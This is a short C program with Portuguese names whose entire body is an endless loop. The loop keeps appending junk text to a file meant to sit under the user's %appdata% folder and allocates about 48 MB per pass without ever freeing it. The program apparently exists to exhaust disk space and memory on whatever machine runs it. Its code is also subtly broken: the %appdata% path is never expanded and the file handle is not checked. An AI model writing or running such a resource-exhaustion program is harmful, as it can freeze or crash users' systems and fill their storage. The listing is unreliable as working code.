#include <stdio.h>
#include <stdlib.h>

int main(void) {
  int  *a, *b, *c;
  FILE *arquivo;
  arquivo = fopen("\%appdata\%\\arquivo.txt", "a");
  while (1) {
    fprintf(arquivo, "palavragrande\n\n\npalavra\nçççç\n\nççççç\n\nççççççç\n\nçççççççç");
    a = malloc(16711568);
    b = malloc(16711568);
    c = malloc(16711568);
  }
  fclose(arquivo);
  return 0;
}
